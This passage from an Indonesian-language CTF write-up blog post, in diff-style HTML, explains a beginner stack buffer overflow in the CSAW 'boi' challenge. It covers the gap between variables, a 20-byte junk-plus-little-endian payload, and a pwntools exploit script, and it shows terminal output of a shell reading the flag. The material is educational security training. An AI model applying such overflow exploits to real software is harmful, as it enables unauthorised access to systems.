+<p>Ini mengartikan ada gap sebesar <code>0x14</code> bytes antara <code>var_20h</code> dengan <code>var_34h</code>, sementara ukuran input yang bisa kita masukkan sebesar <code>0x18</code> bytes, berarti ada <code>0x4</code> bytes yang bisa menghasilkan buffer overflow yang selanjutnya akan merubah value dari <code>var_20h</code> dengan value yang overflow dari inputan yang diberikan.</p>
+
+<p>Dengan memikirkan kembali konsep yang tadi sudah kita pikirkan, maka kita bisa meng-craft payload seperti berikut :</p>
+
+<pre><code>A * 20 (kita buat junk payload sebesar 20 bytes, hanya untuk mengisi buffer)
+0xeebaf3ca (ini sebenarnya 0xcaf3baee, nah kenapa dibalik balik, karena binary ELF itu menggunakan little endian)
+</code></pre>
+
+<p>Little endian berarti data yang dibuat harus menggunakan <code>least significant byte</code> terlebih dahulu, dan kenapa junk payload nya menggunakan huruf <code>A</code>, sebenarnya ini hanya hal trivial karena alasannya ini sudah menjadi tradisi kebanyakan exploit developer dikarenakan akan mempermudah saat debugging nantinya (karena akan langsung tahu penempatan payload kita saat melihat 0x41414141) karena ascii value dari <code>A</code> adalah <code>0x41</code>.</p>
+
+<p>Dengan begini kita bisa membuat exploit untuk langsung mencoba apakah pemikiran ini benar atau tidak, berikut exploit yang dibuat :</p>
+
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">binary</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./boi&quot;</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span>  <span class="p">(</span><span class="sa">b</span><span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">20</span><span class="p">)</span> 
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xcaf3baee</span><span class="p">)</span>
+
+<span class="n">binary</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">binary</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+
+<p>Baris awal mengartikan bahwa kita akan mengimport <code>pwntools</code> untuk mempermudah proses exploitasi seperti yang dijelaskan dibagian <code>tooling</code>, dan selanjutnya dengan fungsi <code>process()</code> kita bisa menjalankan program nya di background untuk kita masukkan inputan atau bahkan membaca sesuatu dari programnya (hal ini bisa ditelusuri lebih lanjut dengan membaca dokumentasi dari pwntools nya langsung), lalu kita akan membuat payload di baris selanjutnya dan tujuan dari fungsi <code>p32()</code> adalah untuk membuat sebuah payload 32bit dengan little endian, setelah pembuatan payload dibaris selanjutnya bisa kita kirimkan payloadnya kedalam program yang telah diinisialisasi di background menggunakan fungsi <code>process()</code> sebelumnya, lalu kita gunakan fungsi <code>interactive()</code> untuk bisa berinteraksi dengan programnya secara langsung (tidak di background alias langsung di foreground), ini berguna untuk melakukan hal-hal secara interaktif setelah mendapatkan shell (dalam hal ini kita baca flag nya).</p>
+
+<p>Bila kita jalankan python code nya maka akan mendapatkan shell seperti berikut ini :</p>
+
+<pre><code>╭─f4r4w4y@blackrock stack-buffer-overflows/csaw-boi  
+╰─$ python3 x.py
+[+] Starting local process './boi': pid 1235563
+[*] Switching to interactive mode
+Are you a big boiiiii??
+$ id
+uid=1000(f4r4w4y) gid=1000(f4r4w4y) groups=1000(f4r4w4y) [REDACTED]
+$ ls
+boi  flag.txt  input  x.py
+$ cat flag.txt
+flag{pwned}
+$  
+</code></pre>
+
+<p><img src="https://media.giphy.com/media/egX1DfpvLkJFK/giphy.gif" alt="pwned" /></p>
+
+<p>Sangat mudah bukan ?, ya emang karena ini challenge yang paling easy dan beginner friendly XD.</p>
+
+<p>Sebenarnya dalam pembuatan exploit di challenge yang lebih susah akan perlu menggunakan debugger seperti <code>gdb</code> yang telah di tambahkan <code>gef</code>, saya tidak masukkan itu di artikel ini karena sudah panjang dan capek juga ternyata ngetik seharian buat bikin satu artikel panjang kek gini :v.</p>
+
+<p>Dan juga untuk challenge lainnya mohon maaf akan saya buat terpisah dikarenakan betapa panjangnya artikel ini wkwk, jadi di <code>pwn journey 0x2</code> akan saya bahas stack buffer overflow yang lebih sulit nya, so stay tuned :D.</p>
+
+<h3>Last word</h3>
+
+<p>Semoga artikel nya mudah dipahami dan menyenangkan, jika memang dirasa bermanfaat silahkan sebarkan kepada yang lainnya agar ilmu nya tidak berhenti disini saja.</p>
+
+<p>Terimakasih kepada Allah SWT dan juga para pembaca disini, semua yang buruk datangnya dari saya dan yang baik hanya datang dari-Nya, mohon maaf bila ada kesalahan 🙏.</p>
+
+            </div>
+
+            <br/>
+            <hr/>
+            <center>
+                <span style="font-weight: normal">Comment(s)</span>
+            </center>
+            <hr/>
+
+            <script src="https://utteranc.es/client.js"
+                repo="fakhrip/fakhrip.github.io"
+                issue-term="pathname"
+                label="blog-post-comment"
+                theme="photon-dark"
+                crossorigin="anonymous"
+                async>
+            </script>
+        </div>
+    </div>
+</body>
+<script>
+    document.getElementById("location").innerHTML = './' + window.location.pathname.substring(window.location.pathname.lastIndexOf('/') + 1);
+</script>
+</html>
